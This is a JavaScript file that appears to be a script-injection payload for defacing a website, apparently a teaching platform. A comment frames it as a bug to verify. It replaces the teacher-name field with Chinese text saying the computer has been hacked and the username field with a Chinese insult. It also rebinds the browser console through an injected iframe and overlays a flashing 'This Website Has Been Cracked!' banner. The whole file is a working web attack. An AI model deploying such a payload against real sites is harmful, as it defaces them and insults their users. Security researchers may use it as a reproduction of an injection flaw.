/*
    This Website Was Cracked For Javascripts Injection
    Please Verify the bug!
*/
document.getElementById('hTeacherName').innerHTML = '你的电脑已被入侵';
document.getElementById('hTeacherName').style.width = '200px';
document.getElementById('userName').innerHTML = '傻逼';


var iframe = document.createElement('iframe');
document.body.appendChild(iframe);
window.console = iframe.contentWindow.console;
var divObj = document.createElement('div');
divObj.style.position = 'absolute';
divObj.style.zIndex = '99999999';
divObj.style.color = 'yellow';
divObj.style.fontSize = '40px';
divObj.innerHTML = 'This Website Has Been Cracked!';
divObj.style.left = '20px';
divObj.style.top = '20px';
divObj.id = 'Cracker';
divObj.style.transition = 'all 1s linear';
divObj.style.webkitTransition = 'all 1s linear';
document.getElementsByTagName('body')[0].appendChild(divObj);
var nowR = 0,nowG = 0,nowB = 0;
function DoAnimation(){
    var R = (nowR + Math.random() * 10000 % 100) % 255;
    var G = (nowG + Math.random() * 10000 % 100) % 255;
    var B = (nowB + Math.random() * 10000 % 100) % 255;
    while(R < 100){
        R = (R + Math.random() * 10000 % 100) % 255;
    }
    while(G < 100){
        G = (G + Math.random() * 10000 % 100) % 255;
    }
    while(B < 100){
        B = (B + Math.random() * 10000 % 100) % 255;
    }
    divObj.style.color = 'rgb(' + R + ',' + G + ',' + B + ')';
    nowR = R;
    nowG = G;
    nowB = B;
    setTimeout(function(){
        requestAnimationFrame(DoAnimation)
    },1000)
}
DoAnimation();